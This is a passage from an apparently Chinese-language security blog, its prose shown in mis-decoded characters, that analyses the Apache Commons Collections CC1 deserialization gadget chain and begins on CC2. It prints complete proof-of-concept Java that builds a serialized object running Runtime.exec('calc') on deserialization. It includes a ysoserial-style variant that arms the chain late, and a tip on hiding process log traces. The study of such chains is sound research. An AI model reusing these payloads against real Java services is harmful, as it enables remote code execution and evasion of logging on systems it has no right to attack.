<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1LazyMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//        Map decorate = TransformedMap.decorate(hm, null, chainedTransformer);</span><br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br><span class="hljs-comment">//        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);</span><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ç”ŸæˆInvocationHandlerç±»å‹çš„ç±»å®ä¾‹</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);<span class="hljs-comment">//ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œä»£ç†invocationHandlerå®ä¾‹</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class,proxymap);<span class="hljs-comment">//å†æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªAnnotationInvocationHandlerï¼Œå¹¶ä¸”å°†proxymapä¼ å…¥ç»™memberValues</span><br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br><span class="hljs-comment">//        oos.writeObject(newInstance);</span><br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å› æ­¤åˆ©ç”¨é“¾ä¸º</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-comment">//æ„Ÿè§‰ä½œè€…åœ¨ç‚«æŠ€ï¼Œå¤ªå·§äº†ï¼ŒQAQ</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>p ç‰›æåˆ°ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å‡ºç°è¿˜æ²¡æœ‰åˆ°<code>readObject</code>å°±å¼¹å‡ºäº†è®¡ç®—å™¨ï¼ŒåŸå› æ˜¯ï¼šåœ¨ä½¿ç”¨ Proxy ä»£ç†äº† map å¯¹è±¡åï¼Œåœ¨ä»»ä½•åœ°æ–¹æ‰§è¡Œ map çš„æ–¹æ³•å°±ä¼šè§¦å‘ Payload å¼¹å‡ºè®¡ç®—å™¨ï¼Œæ‰€ä»¥ï¼Œåœ¨æœ¬åœ°è°ƒè¯•ä»£ç çš„æ—¶å€™ï¼Œå› ä¸ºè°ƒè¯•å™¨ä¼šè°ƒç”¨ä¸€äº› toString ä¹‹ç±»çš„æ–¹æ³•ï¼Œå¯¼è‡´ä¸ç»æ„é—´è§¦å‘äº†å‘½ä»¤</p>
<p>å¦ä¸€ä¸ªå°±æ˜¯åœ¨æ‰§è¡Œå®Œå¯è§æ§åˆ¶å°å‡ºç°äº† ProcessImpl å¼‚å¸¸ï¼Œä¸ºäº†é˜²æ­¢æ—¥å¿—è®°å½•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ ChainedTransformer å¢åŠ ä¸€ä¸ª ConstantTransformer(1)ï¼Œä»è€Œæ©ç›–äº†è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾</p>
</blockquote>
<ul>
<li>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œysoserial å¤„ç†çš„æ–¹å¼ä¸º</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//        Transformer[] actualeviltransformer = &#123;</span><br><span class="hljs-comment">//                new ConstantTransformer(Runtime.class),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="hljs-comment">//                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="hljs-comment">//                new ConstantTransformer(1)</span><br><span class="hljs-comment">//        &#125;;</span><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        <span class="hljs-comment">//fake u</span><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, decorate);<span class="hljs-comment">//ç”ŸæˆInvocationHandlerç±»å‹çš„ç±»å®ä¾‹</span><br>        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandler);<span class="hljs-comment">//ç”Ÿæˆä»£ç†ç±»å®ä¾‹ï¼Œä»£ç†invocationHandlerå®ä¾‹</span><br>        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Retention.class, proxymap);<span class="hljs-comment">//å†æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªAnnotationInvocationHandlerï¼Œå¹¶ä¸”å°†proxymapä¼ å…¥ç»™memberValues</span><br><br>        <span class="hljs-comment">//arm with actual evil transformer chain</span><br>        Field iTransformersF = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-comment">//        iTransformersF.set(fakechainedTransformer,actualeviltransformer);</span><br>        iTransformersF.set(fakechainedTransformer,chainedTransformer);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(invocationHandler);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹Ÿæœ‰ä¸ªå°ç»†èŠ‚ï¼Œä¸ºä»€ä¹ˆå‡<code>Transformer</code>æ•°ç»„éœ€è¦ä¸²èµ·æ¥ï¼Œè€Œåè€Œå…ƒç´ æ›´å¤šçš„ evil<code>Transformer</code>æ•°ç»„æ²¡æœ‰ä¸²èµ·æ¥</p>
<blockquote>
<p>è°ƒæ•´ actualeviltransformer æˆ– chainedTransformer çš„æ³¨é‡Šï¼Œä»¥åŠåå°„ä¿®æ”¹ iTransformersF å˜é‡çš„æ³¨é‡Šï¼Œå¯ä»¥å‘ç°ä¸²èµ·æ¥çš„æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨</p>
</blockquote>
<p>å› ä¸ºä½¿ç”¨<code>LazyMap.decorate</code>è£…é¥°ï¼Œæ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>Transformer[]</code>çš„é‡è½½æ–¹æ³•ï¼Œå› æ­¤å¿…é¡»ä¸²èµ·æ¥ï¼Œè€Œ<code>ChainedTransformer</code>æœ‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br></code></pre></td></tr></table></figure>

<p>è€Œé€šè¿‡åå°„ä¿®æ”¹åˆ°çš„<code>ChainedTransformer</code>å±æ€§<code>iTransformers</code>å´æ˜¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer[] iTransformers;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829141357207.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220829142036388.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>åè®°ï¼šè¿™æ¡é“¾åˆ†æåœ¨å…¥é—¨çš„æ—¶å€™éš¾åº¦ç¡®å®æŒºå¤§çš„ï¼Œä½†æ˜¯å‘ç°ä¸ä¼šçš„å°±åå¤çœ‹æºç å’Œä¸Šä¸‹æ–‡ï¼Œæ‰¾èµ„æ–™å†™ demoï¼Œè°ƒè¯•åˆ†æï¼Œè¿˜æ˜¯ä¸€æ­¥æ­¥åœ°å­¦ä¹ åˆ†æäº†ä¸€éï¼Œå°¤å…¶æ˜¯ç¼–å†™ä¸€å—å¯¹å¦‚ä½•æ„é€ æœ‰äº†åˆæ­¥çš„ç†è§£ï¼›åé¢æ˜¯ AnnotationInvocationHandler.invoke()-&gt;LazyMap.get()ï¼Œä¸ºäº†èƒ½è§¦å‘ invokeï¼Œä½¿ç”¨äº†åŠ¨æ€ä»£ç†çš„æ–¹å¼ï¼Œé‚£èƒ½ä¸èƒ½ä½¿ç”¨åå°„è°ƒç”¨ AnnotationInvocationHandler.invoke()å‘¢ï¼Ÿ</p>
<p>å…¶å®è¿™ä¸ªæƒ³æ³•å¾ˆè ¢ï¼Œè¯´åˆ°åº•è¿˜æ˜¯å­¦ä¹ åºæ‚çš„å†…å®¹é€ æˆçš„å¹»è§‰ï¼Œå½“ç„¶èƒ½å¤Ÿè°ƒç”¨è¿™ä¸ª invoke æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ª invoke æ–¹æ³•éœ€è¦ä¼ å…¥çš„éƒ½æ˜¯ä»£ç†å¯¹è±¡ï¼Œä»£ç†å¯¹è±¡å†…çš„æ–¹æ³•</p>
<p>å…·ä½“çš„ç»†èŠ‚æ›´åº”è¯¥å…³æ³¨çš„æ˜¯ï¼Œè°ƒç”¨äº†ä»£ç†å¯¹è±¡å¦‚ä½•è§¦å‘äº† invoke æ–¹æ³•ï¼Œä»¥åŠä¼ å…¥çš„å‚æ•°æ˜¯ä»å“ªé‡Œè·å¾—çš„</p>
<p>LazyMap åœ¨ CommonsCollections4.0 æ²¡æœ‰ LazyMap.decorate æ–¹æ³•ï¼Œè€Œæ˜¯æ”¹äº†ä¸€ä¸ªå LazyMap.lazymap</p>
<p>å› æ­¤ CC1ã€CC3 éƒ½å¯ä»¥ç”¨ CommonsCollections4 çš„ jar åŒ…ï¼Œåœ¨ LazyMap æ—¶æ¢ä¸€ä¸‹æ–¹æ³•åè€Œå·²</p>
</blockquote>
<h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="Pre-1"><a href="#Pre-1" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-1"><a href="#é™åˆ¶-1" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 4.0</p>
<p>javassit</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-1"><a href="#åˆ©ç”¨é“¾-1" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">		...</span><br><span class="hljs-operator">			</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformingComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-1"><a href="#å…³é”®ç±»-1" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">PriorityQueue</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">TransformingComparator</span><br></code></pre></td></tr></table></figure>

<p>maven æ·»åŠ ä¾èµ–</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆæ¥å­¦ä¹ ä¸€äº›é“ºå«çš„å‰ç½®çŸ¥è¯†ï¼Œæºä»£ç ã€å­—èŠ‚ç ã€æœºå™¨ç è¿™äº›æ¦‚å¿µå°±ä¸å†èµ˜è¿°äº†</p>
<p>å­—èŠ‚ç æ–‡ä»¶æ˜¯æœ‰å›ºå®šçš„ç»“æ„çš„ï¼Œ<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-4.html">JVM è§„èŒƒ</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs class">ClassFile &#123;<br>    u4             magic;//cafe babeæ˜¯é­”æ•°å³classæ–‡ä»¶æ ‡è¯†ç¬¦,JVMåŠ è½½classæ–‡ä»¶æ—¶ä¼šå…ˆè¯»å–è¿™4ä¸ªå­—èŠ‚<br>    u2             minor_version;//å‰¯ç‰ˆæœ¬å·<br>    u2             major_version;//ä¸»ç‰ˆæœ¬å· 0034æ˜¯jdk1.8<br>    u2             constant_pool_count;//å¸¸é‡æ± è®¡æ•°å™¨<br>    cp_info        constant_pool[constant_pool_count-1];//å¸¸é‡æ± <br>    u2             access_flags;//è®¿é—®æ ‡è¯†<br>    u2             this_class;//å½“å‰ç±»<br>    u2             super_class;//çˆ¶ç±»<br>    u2             interfaces_count;//ç±»ç»§æ‰¿æˆ–å®ç°æ¥å£æ•°<br>    u2             interfaces[interfaces_count];//æ¥å£æ•°ç»„<br>    u2             fields_count;//ç±»æˆå‘˜å˜é‡æ•°<br>    field_info     fields[fields_count];//ç±»æˆå‘˜å˜é‡æ•°ç»„<br>    u2             methods_count;//ç±»æˆå‘˜æ–¹æ³•æ•°<br>    method_info    methods[methods_count];//ç±»æˆå‘˜æ–¹æ³•æ•°ç»„<br>    u2             attributes_count;//ç±»å±æ€§æ•°<br>    attribute_info attributes[attributes_count];//å±æ€§æ•°ç»„<br>&#125;<br></code></pre></td></tr></table></figure>

